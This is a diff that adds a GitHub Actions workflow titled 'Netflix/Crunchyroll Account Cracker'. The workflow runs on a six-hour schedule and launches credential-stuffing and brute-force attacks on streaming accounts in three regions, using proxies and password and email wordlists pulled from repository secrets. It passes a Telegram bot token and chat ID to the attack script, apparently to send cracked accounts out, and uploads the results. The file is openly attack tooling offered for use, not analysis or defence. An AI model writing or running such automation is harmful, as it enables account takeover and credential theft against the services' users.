@@ -1,0 +1,70 @@
+name: Netflix/Crunchyroll Account Cracker
+
+on:
+  schedule:
+    # Run every 6 hours
+    - cron: '0 */6 * * *'
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'Cracking mode'
+        required: true
+        default: 'credential_stuffing'
+        type: choice
+        options:
+          - credential_stuffing
+          - brute_force
+          - mixed
+
+env:
+  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+  PROXY_FILE: config/proxies.txt
+  OUTPUT_DIR: output
+
+jobs:
+  crack-accounts:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        region: ['us', 'eu', 'asia']
+      fail-fast: false
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      
+      - name: Install dependencies
+        run: |
+          pip install -r requirements.txt
+          pip install aiohttp requests beautifulsoup4 lxml telebot
+      
+      - name: Create config files
+        run: |
+          mkdir -p config/output
+          echo "${{ secrets.PROXY_LIST }}" > config/proxies.txt
+          echo "${{ secrets.WORDLIST_PASSWORDS }}" > config/wordlists/passwords.txt
+          echo "${{ secrets.WORDLIST_EMAILS }}" > config/wordlists/emails.txt
+      
+      - name: Run Credential Stuffing
+        env:
+          MODE: ${{ github.event.inputs.mode || 'credential_stuffing' }}
+          REGION: ${{ matrix.region }}
+        run: |
+          python scripts/main.py \
+            --mode "$MODE" \
+            --region "$REGION" \
+            --proxy-file config/proxies.txt \
+            --telegram-token "$TELEGRAM_BOT_TOKEN" \
+            --chat-id "$TELEGRAM_CHAT_ID"
+      
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: results-${{ matrix.region }}
+          path: output/
